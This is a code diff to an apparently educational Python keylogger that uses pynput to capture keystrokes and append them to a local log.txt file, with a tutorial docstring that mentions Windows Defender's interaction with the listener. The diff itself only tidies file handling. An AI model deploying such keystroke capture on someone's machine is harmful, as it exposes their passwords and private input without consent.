@@ -30,7 +30,7 @@ def onRelease(key):
 # Opens a text file called "log.txt" in append mode, removes all quotation marks,
 # and then writes logged keys to the file (adding newlines instead of spaces and removing miscellaneous keys like backspaces)
 def writeFile(keys):
-    with open("log.txt", "a") as file:  # If this file doesn't already exist, you'll need to make one yourself
+    with open("log.txt", "a") as file:
         for key in keys:
             k = str(key).replace("'", "")
             if(k.find("space") > 0):
@@ -39,6 +39,8 @@ def writeFile(keys):
                     file.write(k)
                 
             file.write(str(key))
+        
+        file.close()
 
 # Infinite loop listening to keystrokes
 with Listener(onPress = onPress, onRelease=onRelease) as listener:
@@ -52,3 +54,4 @@ What did I learn from this tutorial?
     2. How Windows Defender interacts with pynput, specifically with .join() and how it can prevent code termination
     3. How to use pynput to log keys
 """
+
